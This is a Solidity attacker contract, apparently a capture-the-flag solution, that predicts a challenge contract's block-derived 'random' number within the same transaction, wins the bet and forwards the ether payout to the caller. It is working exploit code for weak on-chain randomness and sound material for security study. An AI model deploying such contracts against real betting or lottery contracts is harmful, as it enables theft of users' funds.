pragma solidity ^0.8.9;

interface IChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    IChallenge private challenge;
    constructor (address challengeAddress) {
      challenge = IChallenge(challengeAddress);
    }

    function attack() external payable {
        uint8 answer =  uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value:1 ether}(answer);
        require(challenge.isComplete(),"challenge not completed");
        payable(msg.sender).transfer(2 ether);
    }

    receive() external payable {}
}